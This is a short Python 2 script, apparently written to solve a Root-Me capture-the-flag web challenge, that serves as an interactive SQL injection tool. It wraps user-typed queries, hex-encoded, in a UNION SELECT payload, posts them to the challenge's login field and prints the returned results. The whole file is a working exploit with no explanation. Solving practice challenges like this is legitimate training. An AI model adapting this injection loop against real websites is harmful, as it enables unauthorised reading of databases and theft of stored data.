import requests

url = 'http://challenge01.root-me.org/web-serveur/ch49/index.php?action=search'



qr = '\' union select {yours} -- '
while True:
    yours = raw_input('[['+qr+']]'+'\nyours query is going to convert to hex\nquery> ')
    payload = qr.replace('{yours}', '0x'+yours.encode('hex'))
    print 'query was sent :'
    print payload
    datas = {'login': payload}

    res = requests.post(url, data = datas)

    if res.text.find('Results') != -1:
        print '############################################'
        
        print res.text.split('Results</legend>')[1].split('</fieldset>')[0]
        print '############################################'
    else:
        print res.text
        print '\n\n\n'

        print 'Not bad...'



